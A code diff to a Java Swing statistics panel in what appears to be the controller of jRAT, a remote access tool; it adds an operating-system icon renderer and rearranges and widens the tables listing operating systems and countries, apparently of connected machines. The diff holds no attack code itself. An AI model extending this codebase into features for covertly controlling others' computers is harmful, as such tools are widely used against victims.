@@ -16,6 +16,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.threads.ThreadGraph;
 import se.jrat.client.utils.FlagUtils;
+import se.jrat.client.utils.IconUtils;
 
 import com.redpois0n.graphs.graph.Graph;
 import com.redpois0n.graphs.graph.GraphColors;
@@ -58,6 +59,18 @@ public class PanelMainStats extends JPanel {
 			return c;
 		}
 	};
+	
+	private DefaultTableCellRenderer osRenderer = new DefaultTableCellRenderer() {
+		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
+			JLabel c = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
+
+			if (value != null && value.toString().length() > 0) {
+				c.setIcon(IconUtils.getOSIconFromString(value.toString()));
+			}
+
+			return c;
+		}
+	};
 
 	public PanelMainStats() {
 		init();
@@ -69,9 +82,7 @@ public class PanelMainStats extends JPanel {
 		if (!initialized) {
 			initialized = true;
 
-			osTableScrollPane = new JScrollPane();
-			add(osTableScrollPane);
-
+			
 			osGraph = new Graph(new GraphColors()) {
 				@Override
 				public synchronized void onUpdate(List<GraphEntry> list, int x) {
@@ -114,30 +125,27 @@ public class PanelMainStats extends JPanel {
 
 			countryScrollPane = new JScrollPane(countryGraph);
 			add(countryScrollPane);
-
 			countryModel = new DefaultTableModel(new Object[][] {}, new String[] { "Countries" });
 			countryTable = new JTable(countryModel);
 			countryTable.setDefaultRenderer(Object.class, flagRenderer);
-
-			osTableScrollPane.setViewportView(osTable);
-
 			countryTableScrollPane = new JScrollPane();
 			add(countryTableScrollPane);
+			countryTableScrollPane.setViewportView(countryTable);
 
 			osModel = new DefaultTableModel(new Object[][] {}, new String[] { "Operating Systems" });
 			osTable = new JTable(osModel);
-			osTable.setDefaultRenderer(Object.class, flagRenderer);
+			osTable.setDefaultRenderer(Object.class, osRenderer);
+			osTableScrollPane = new JScrollPane();
+			add(osTableScrollPane);
+			osTableScrollPane.setViewportView(osTable);
 
-			countryTableScrollPane.setViewportView(countryTable);
 		}
 
-		osTableScrollPane.setBounds(5, 5, 110, height / 2 - 10);
+		osTableScrollPane.setBounds(5, 5, 150, height / 2 - 10);
+		osScrollPane.setBounds(160, 5, width - 160 - 10, height / 2 - 10);
 
-		osScrollPane.setBounds(120, 5, width - 120 - 10, height / 2 - 10);
-
-		countryTableScrollPane.setBounds(5, height / 2, 110, height / 2 - 10);
-
-		countryScrollPane.setBounds(120, height / 2, width - 120 - 10, height / 2 - 10);
+		countryTableScrollPane.setBounds(5, height / 2, 150, height / 2 - 10);
+		countryScrollPane.setBounds(160, height / 2, width - 160 - 10, height / 2 - 10);
 
 		addComponentListener(new ComponentListener() {
 
